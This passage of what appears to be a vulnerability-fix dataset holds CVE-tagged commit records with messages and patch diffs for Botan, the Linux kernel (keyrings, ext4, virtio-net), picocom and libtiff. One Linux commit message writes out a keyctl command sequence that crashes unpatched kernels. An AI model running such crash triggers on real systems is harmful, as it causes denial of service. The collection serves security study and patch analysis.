<botan/internal/safeint.h>\n \n namespace Botan {\n \n@@ -126,7 +127,9 @@ size_t find_eoc(DataSource* ber)\n       size_t item_size = decode_length(&source, length_size);\n       source.discard_next(item_size);\n \n-      length += item_size + length_size + tag_size;\n+      length = BOTAN_CHECKED_ADD(length, item_size);\n+      length = BOTAN_CHECKED_ADD(length, tag_size);\n+      length = BOTAN_CHECKED_ADD(length, length_size);\n \n       if(type_tag == EOC && class_tag == UNIVERSAL)\n          break;\ndiff --git a/src/lib/utils/info.txt b/src/lib/utils/info.txt\nindex 820dd407d9..306e6e9adb 100644\n--- a/src/lib/utils/info.txt\n+++ b/src/lib/utils/info.txt\n@@ -1,4 +1,4 @@\n-define UTIL_FUNCTIONS 20150919\n+define UTIL_FUNCTIONS 20161127\n \n load_on always\n \n@@ -31,6 +31,7 @@ filesystem.h\n os_utils.h\n prefetch.h\n rounding.h\n+safeint.h\n semaphore.h\n stl_util.h\n </header:internal>\ndiff --git a/src/lib/utils/safeint.h b/src/lib/utils/safeint.h\nnew file mode 100644\nindex 0000000000..e0bd66232c\n--- /dev/null\n+++ b/src/lib/utils/safeint.h\n@@ -0,0 +1,39 @@\n+/*\n+* Safe(r) Integer Handling\n+* (C) 2016 Jack Lloyd\n+*\n+* Botan is released under the Simplified BSD License (see license.txt)\n+*/\n+\n+#ifndef BOTAN_UTILS_SAFE_INT_H__\n+#define BOTAN_UTILS_SAFE_INT_H__\n+\n+#include <botan/exceptn.h>\n+#include <string>\n+\n+namespace Botan {\n+\n+class Integer_Overflow_Detected : public Exception\n+   {\n+   public:\n+      Integer_Overflow_Detected(const std::string& file, int line) :\n+         Exception(\"Integer overflow detected at \" + file + \":\" + std::to_string(line))\n+         {}\n+   };\n+\n+inline size_t checked_add(size_t x, size_t y, const char* file, int line)\n+   {\n+   // TODO: use __builtin_x_overflow on GCC and Clang\n+   size_t z = x + y;\n+   if(z < x)\n+      {\n+      throw Integer_Overflow_Detected(file, line);\n+      }\n+   return z;\n+   }\n+\n+#define BOTAN_CHECKED_ADD(x,y) checked_add(x,y,__FILE__,__LINE__)\n+\n+}\n+\n+#endif\n", "owner": "randombit", "repo": "botan", "source": "cve"}
{"CVE_ID": "CVE-2015-7872", "CWE_ID": "20", "category": "security", "commit_id": "f05819df10d7b09f6d1eb6f8534a8f68e5a4fe61", "commit_message": "From f05819df10d7b09f6d1eb6f8534a8f68e5a4fe61 Mon Sep 17 00:00:00 2001\nFrom: David Howells <dhowells@redhat.com>\nDate: Thu, 15 Oct 2015 17:21:37 +0100\nSubject: KEYS: Fix crash when attempt to garbage collect an uninstantiated\n keyring\n\nThe following sequence of commands:\n\n    i=`keyctl add user a a @s`\n    keyctl request2 keyring foo bar @t\n    keyctl unlink $i @s\n\ntries to invoke an upcall to instantiate a keyring if one doesn't already\nexist by that name within the user's keyring set.  However, if the upcall\nfails, the code sets keyring->type_data.reject_error to -ENOKEY or some\nother error code.  When the key is garbage collected, the key destroy\nfunction is called unconditionally and keyring_destroy() uses list_empty()\non keyring->type_data.link - which is in a union with reject_error.\nSubsequently, the kernel tries to unlink the keyring from the keyring names\nlist - which oopses like this:\n\n\tBUG: unable to handle kernel paging request at 00000000ffffff8a\n\tIP: [<ffffffff8126e051>] keyring_destroy+0x3d/0x88\n\t...\n\tWorkqueue: events key_garbage_collector\n\t...\n\tRIP: 0010:[<ffffffff8126e051>] keyring_destroy+0x3d/0x88\n\tRSP: 0018:ffff88003e2f3d30  EFLAGS: 00010203\n\tRAX: 00000000ffffff82 RBX: ffff88003bf1a900 RCX: 0000000000000000\n\tRDX: 0000000000000000 RSI: 000000003bfc6901 RDI: ffffffff81a73a40\n\tRBP: ffff88003e2f3d38 R08: 0000000000000152 R09: 0000000000000000\n\tR10: ffff88003e2f3c18 R11: 000000000000865b R12: ffff88003bf1a900\n\tR13: 0000000000000000 R14: ffff88003bf1a908 R15: ffff88003e2f4000\n\t...\n\tCR2: 00000000ffffff8a CR3: 000000003e3ec000 CR4: 00000000000006f0\n\t...\n\tCall Trace:\n\t [<ffffffff8126c756>] key_gc_unused_keys.constprop.1+0x5d/0x10f\n\t [<ffffffff8126ca71>] key_garbage_collector+0x1fa/0x351\n\t [<ffffffff8105ec9b>] process_one_work+0x28e/0x547\n\t [<ffffffff8105fd17>] worker_thread+0x26e/0x361\n\t [<ffffffff8105faa9>] ? rescuer_thread+0x2a8/0x2a8\n\t [<ffffffff810648ad>] kthread+0xf3/0xfb\n\t [<ffffffff810647ba>] ? kthread_create_on_node+0x1c2/0x1c2\n\t [<ffffffff815f2ccf>] ret_from_fork+0x3f/0x70\n\t [<ffffffff810647ba>] ? kthread_create_on_node+0x1c2/0x1c2\n\nNote the value in RAX.  This is a 32-bit representation of -ENOKEY.\n\nThe solution is to only call ->destroy() if the key was successfully\ninstantiated.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\nTested-by: Dmitry Vyukov <dvyukov@google.com>\n---\n security/keys/gc.c | 6 ++++--\n 1 file changed, 4 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/security/keys/gc.c b/security/keys/gc.c\nindex 39eac1fd5706..addf060399e0 100644\n--- a/security/keys/gc.c\n+++ b/security/keys/gc.c\n@@ -134,8 +134,10 @@ static noinline void key_gc_unused_keys(struct list_head *keys)\n \t\tkdebug(\"- %u\", key->serial);\n \t\tkey_check(key);\n \n-\t\t/* Throw away the key data */\n-\t\tif (key->type->destroy)\n+\t\t/* Throw away the key data if the key is instantiated */\n+\t\tif (test_bit(KEY_FLAG_INSTANTIATED, &key->flags) &&\n+\t\t    !test_bit(KEY_FLAG_NEGATIVE, &key->flags) &&\n+\t\t    key->type->destroy)\n \t\t\tkey->type->destroy(key);\n \n \t\tsecurity_key_free(key);\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2015-0275", "CWE_ID": "17", "category": "security", "commit_id": "0f2af21aae11972fa924374ddcf52e88347cf5a8", "commit_message": "From 0f2af21aae11972fa924374ddcf52e88347cf5a8 Mon Sep 17 00:00:00 2001\nFrom: Lukas Czerner <lczerner@redhat.com>\nDate: Fri, 3 Apr 2015 00:09:13 -0400\nSubject: ext4: allocate entire range in zero range\n\nCurrently there is a bug in zero range code which causes zero range\ncalls to only allocate block aligned portion of the range, while\nignoring the rest in some cases.\n\nIn some cases, namely if the end of the range is past i_size, we do\nattempt to preallocate the last nonaligned block. However this might\ncause kernel to BUG() in some carefully designed zero range requests\non setups where page size > block size.\n\nFix this problem by first preallocating the entire range, including\nthe nonaligned edges and converting the written extents to unwritten\nin the next step. This approach will also give us the advantage of\nhaving the range to be as linearly contiguous as possible.\n\nSigned-off-by: Lukas Czerner <lczerner@redhat.com>\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>\n---\n fs/ext4/extents.c | 31 +++++++++++++++++++------------\n 1 file changed, 19 insertions(+), 12 deletions(-)\n\n", "diff_code": "diff --git a/fs/ext4/extents.c b/fs/ext4/extents.c\nindex 2e6af88d112f..3cc17aacc4c7 100644\n--- a/fs/ext4/extents.c\n+++ b/fs/ext4/extents.c\n@@ -4797,12 +4797,6 @@ static long ext4_zero_range(struct file *file, loff_t offset,\n \telse\n \t\tmax_blocks -= lblk;\n \n-\tflags = EXT4_GET_BLOCKS_CREATE_UNWRIT_EXT |\n-\t\tEXT4_GET_BLOCKS_CONVERT_UNWRITTEN |\n-\t\tEXT4_EX_NOCACHE;\n-\tif (mode & FALLOC_FL_KEEP_SIZE)\n-\t\tflags |= EXT4_GET_BLOCKS_KEEP_SIZE;\n-\n \tmutex_lock(&inode->i_mutex);\n \n \t/*\n@@ -4819,15 +4813,28 @@ static long ext4_zero_range(struct file *file, loff_t offset,\n \t\tret = inode_newsize_ok(inode, new_size);\n \t\tif (ret)\n \t\t\tgoto out_mutex;\n-\t\t/*\n-\t\t * If we have a partial block after EOF we have to allocate\n-\t\t * the entire block.\n-\t\t */\n-\t\tif (partial_end)\n-\t\t\tmax_blocks += 1;\n \t}\n \n+\tflags = EXT4_GET_BLOCKS_CREATE_UNWRIT_EXT;\n+\tif (mode & FALLOC_FL_KEEP_SIZE)\n+\t\tflags |= EXT4_GET_BLOCKS_KEEP_SIZE;\n+\n+\t/* Preallocate the range including the unaligned edges */\n+\tif (partial_begin || partial_end) {\n+\t\tret = ext4_alloc_file_blocks(file,\n+\t\t\t\tround_down(offset, 1 << blkbits) >> blkbits,\n+\t\t\t\t(round_up((offset + len), 1 << blkbits) -\n+\t\t\t\t round_down(offset, 1 << blkbits)) >> blkbits,\n+\t\t\t\tnew_size, flags, mode);\n+\t\tif (ret)\n+\t\t\tgoto out_mutex;\n+\n+\t}\n+\n+\t/* Zero range excluding the unaligned edges */\n \tif (max_blocks > 0) {\n+\t\tflags |= (EXT4_GET_BLOCKS_CONVERT_UNWRITTEN |\n+\t\t\t  EXT4_EX_NOCACHE);\n \n \t\t/* Now release the pages and zero block aligned part of pages*/\n \t\ttruncate_pagecache_range(inode, start, end - 1);\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2015-9059", "CWE_ID": "77", "category": "security", "commit_id": "1ebc60b20fbe9a02436d5cbbf8951714e749ddb1", "commit_message": "From 1ebc60b20fbe9a02436d5cbbf8951714e749ddb1 Mon Sep 17 00:00:00 2001\nFrom: Nick Patavalis <npat@efault.net>\nDate: Tue, 18 Aug 2015 14:40:48 +0300\nSubject: [PATCH] Do not use \"/bin/sh\" to run external commands.\n\nPicocom no longer uses /bin/sh to run external commands for\nfile-transfer operations. Parsing the command line and spliting it into\narguments is now performed internally by picocom, using quoting rules\nvery similar to those of the Unix shell. Hopefully, this makes it\nimpossible to inject shell-commands when supplying filenames or\nextra arguments to the send- and receive-file commands.\n---\n Makefile  |  4 ++--\n picocom.c | 63 +++++++++++++++++++++++++++++--------------------------\n 2 files changed, 35 insertions(+), 32 deletions(-)\n\n", "diff_code": "diff --git a/Makefile b/Makefile\nindex ed37bfd..b110bd5 100644\n--- a/Makefile\n+++ b/Makefile\n@@ -33,12 +33,12 @@ CPPFLAGS += -DSEND_RECEIVE_HISTFILE=\\\"$(SEND_RECEIVE_HISTFILE)\\\" \\\n picocom : linenoise-1.0/linenoise.o\n linenoise-1.0/linenoise.o : linenoise-1.0/linenoise.c linenoise-1.0/linenoise.h\n \n-\n-picocom : picocom.o term.o\n+picocom : picocom.o term.o split.o\n #\t$(LD) $(LDFLAGS) -o $@ $+ $(LDLIBS)\n \n picocom.o : picocom.c term.h\n term.o : term.c term.h\n+split.o : split.c split.h\n \n \n doc : picocom.8 picocom.8.html picocom.8.ps\ndiff --git a/picocom.c b/picocom.c\nindex 432e3b7..e4e898c 100644\n--- a/picocom.c\n+++ b/picocom.c\n@@ -48,6 +48,7 @@\n #define _GNU_SOURCE\n #include <getopt.h>\n \n+#include \"split.h\"\n #include \"term.h\"\n #ifdef LINENOISE\n #include \"linenoise-1.0/linenoise.h\"\n@@ -721,6 +722,9 @@ show_status (int dtr_up)\n \n /**********************************************************************/\n \n+#define RUNCMD_ARGS_MAX 32\n+#define RUNCMD_EXEC_FAIL 126\n+\n void\n establish_child_signal_handlers (void)\n {\n@@ -735,10 +739,8 @@ establish_child_signal_handlers (void)\n \tsigaction (SIGTERM, &dfl_action, NULL);\n }\n \n-#define EXEC \"exec \"\n-\n int\n-run_cmd(int fd, ...)\n+run_cmd(int fd, const char *cmd, const char *args_extra)\n {\n \tpid_t pid;\n \tsigset_t sigm, sigm_old;\n@@ -781,8 +783,10 @@ run_cmd(int fd, ...)\n \t} else {\n \t\t/* child: external program */\n \t\tlong fl;\n-\t\tchar cmd[512];\n-\n+\t\tint argc;\n+\t\tchar *argv[RUNCMD_ARGS_MAX + 1];\n+\t\tint r;\n+\t\t\t\n \t\t/* unmanage terminal, and reset it to canonical mode */\n \t\tterm_remove(STI);\n \t\t/* unmanage serial port fd, without reset */\n@@ -796,37 +800,36 @@ run_cmd(int fd, ...)\n \t\tclose(STO);\n \t\tdup2(fd, STI);\n \t\tdup2(fd, STO);\n-\t\t{\n-\t\t\t/* build command-line */\n-\t\t\tchar *c, *ce;\n-\t\t\tconst char *s;\n-\t\t\tint n;\n-\t\t\tva_list vls;\n-\t\t\t\n-\t\t\tstrcpy(cmd, EXEC);\n-\t\t\tc = &cmd[sizeof(EXEC)- 1];\n-\t\t\tce = cmd + sizeof(cmd) - 1;\n-\t\t\tva_start(vls, fd);\n-\t\t\twhile ( (s = va_arg(vls, const char *)) ) {\n-\t\t\t\tn = strlen(s);\n-\t\t\t\tif ( c + n + 1 >= ce ) break;\n-\t\t\t\tmemcpy(c, s, n); c += n;\n-\t\t\t\t*c++ = ' ';\n-\t\t\t}\n-\t\t\tva_end(vls);\n-\t\t\t*c = '\\0';\n+\t\t\n+\t\t/* build command arguments vector */\n+\t\targc = 0;\n+\t\tr = split_quoted(cmd, &argc, argv, RUNCMD_ARGS_MAX);\n+\t\tif ( r < 0 ) {\n+\t\t\tfd_printf(STDERR_FILENO, \"Cannot parse command\\n\");\n+\t\t\texit(RUNCMD_EXEC_FAIL);\n+\t\t}\n+\t\tr = split_quoted(args_extra, &argc, argv, RUNCMD_ARGS_MAX);\n+\t\tif ( r < 0 ) {\n+\t\t\tfd_printf(STDERR_FILENO, \"Cannot parse extra args\\n\");\n+\t\t\texit(RUNCMD_EXEC_FAIL);\n \t\t}\n+\t\tif ( argc < 1 ) {\n+\t\t\tfd_printf(STDERR_FILENO, \"No command given\\n\");\n+\t\t\texit(RUNCMD_EXEC_FAIL);\n+\t\t}\t\n+\t\targv[argc] = NULL;\n+\t\t\t\n \t\t/* run extenral command */\n-\t\tfd_printf(STDERR_FILENO, \"%s\\n\", &cmd[sizeof(EXEC) - 1]);\n+\t\tfd_printf(STDERR_FILENO, \"$ %s %s\\n\", cmd, args_extra);\n \t\testablish_child_signal_handlers();\n \t\tsigprocmask(SIG_SETMASK, &sigm_old, NULL);\n-\t\texecl(\"/bin/sh\", \"sh\", \"-c\", cmd, NULL);\n-\t\texit(42);\n+\t\texecvp(argv[0], argv);\n+\n+\t\tfd_printf(STDERR_FILENO, \"exec: %s\\n\", strerror(errno));\n+\t\texit(RUNCMD_EXEC_FAIL);\n \t}\n }\n \n-#undef EXEC\n-\n /**********************************************************************/\n \n /* Process command key. Returns non-zero if command results in picocom\n@@ -944,7 +947,7 @@ do_command (unsigned char c)\n \t\t\tfd_printf(STO, \"*** cannot read filename ***\\r\\n\");\n \t\t\tbreak;\n \t\t}\n-\t\trun_cmd(tty_fd, xfr_cmd, fname, NULL);\n+\t\trun_cmd(tty_fd, xfr_cmd, fname);\n \t\tfree(fname);\n \t\tbreak;\n \tcase KEY_BREAK:\n", "owner": "npat-efault", "repo": "picocom", "source": "cve"}
{"CVE_ID": "CVE-2015-5156", "CWE_ID": "119", "category": "security", "commit_id": "48900cb6af4282fa0fb6ff4d72a81aa3dadb5c39", "commit_message": "From 48900cb6af4282fa0fb6ff4d72a81aa3dadb5c39 Mon Sep 17 00:00:00 2001\nFrom: Jason Wang <jasowang@redhat.com>\nDate: Wed, 5 Aug 2015 10:34:04 +0800\nSubject: [PATCH] virtio-net: drop NETIF_F_FRAGLIST\n\nvirtio declares support for NETIF_F_FRAGLIST, but assumes\nthat there are at most MAX_SKB_FRAGS + 2 fragments which isn't\nalways true with a fraglist.\n\nA longer fraglist in the skb will make the call to skb_to_sgvec overflow\nthe sg array, leading to memory corruption.\n\nDrop NETIF_F_FRAGLIST so we only get what we can handle.\n\nCc: Michael S. Tsirkin <mst@redhat.com>\nSigned-off-by: Jason Wang <jasowang@redhat.com>\nAcked-by: Michael S. Tsirkin <mst@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n drivers/net/virtio_net.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/drivers/net/virtio_net.c b/drivers/net/virtio_net.c\nindex 7fbca37a1adff..237f8e5e493dd 100644\n--- a/drivers/net/virtio_net.c\n+++ b/drivers/net/virtio_net.c\n@@ -1756,9 +1756,9 @@ static int virtnet_probe(struct virtio_device *vdev)\n \t/* Do we support \"hardware\" checksums? */\n \tif (virtio_has_feature(vdev, VIRTIO_NET_F_CSUM)) {\n \t\t/* This opens up the world of extra features. */\n-\t\tdev->hw_features |= NETIF_F_HW_CSUM|NETIF_F_SG|NETIF_F_FRAGLIST;\n+\t\tdev->hw_features |= NETIF_F_HW_CSUM | NETIF_F_SG;\n \t\tif (csum)\n-\t\t\tdev->features |= NETIF_F_HW_CSUM|NETIF_F_SG|NETIF_F_FRAGLIST;\n+\t\t\tdev->features |= NETIF_F_HW_CSUM | NETIF_F_SG;\n \n \t\tif (virtio_has_feature(vdev, VIRTIO_NET_F_GSO)) {\n \t\t\tdev->hw_features |= NETIF_F_TSO | NETIF_F_UFO\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2013-4244", "CWE_ID": "119", "category": "security", "commit_id": "ce6841d9e41d621ba23cf18b190ee6a23b2cc833", "commit_message": "From ce6841d9e41d621ba23cf18b190ee6a23b2cc833 Mon Sep 17 00:00:00 2001\nFrom: fwarmerdam <fwarmerdam>\nDate: Wed, 14 Aug 2013 13:59:16 +0000\nSubject: [PATCH] fix possible OOB write in gif2tiff.c\n\n---\n ChangeLog        | 4 ++++\n tools/gif2tiff.c | 4 ++++\n 2 files changed, 8 insertions(+)\n\n", "diff_code": "diff --git a/ChangeLog b/ChangeLog\nindex 6fbd83fe..ebfb3e68 100644\n--- a/ChangeLog\n+++ b/ChangeLog\n@@ -1,3 +1,7 @@\n+2013-08-14  Frank Warmerdam  <warmerdam@pobox.com>\n+\n+\t* tools/gif2tiff.c: fix possible OOB write (#2452, CVE-2013-4244) \n+\n 2013-08-13  Frank Warmerdam  <warmerdam@pobox.com>\n \n \t* tools/gif2tiff.c: Be more careful about corrupt or\ndiff --git a/tools/gif2tiff.c b/tools/gif2tiff.c\nindex 277ad93d..8405f710 100644\n--- a/tools/gif2tiff.c\n+++ b/tools/gif2tiff.c\n@@ -400,6 +400,10 @@ process(register int code, unsigned char** fill)\n     }\n \n     if (oldcode == -1) {\n+        if (code >= clear) {\n+            fprintf(stderr, \"bad input: code=%d is larger than clear=%d\\n\",code, clear);\n+            return 0;\n+        }\n \t*(*fill)++ = suffix[code];\n \tfirstchar = oldcode = code;\n \treturn 1;\n", "owner": "vadz", "repo": "libtiff", "source": "cve"}
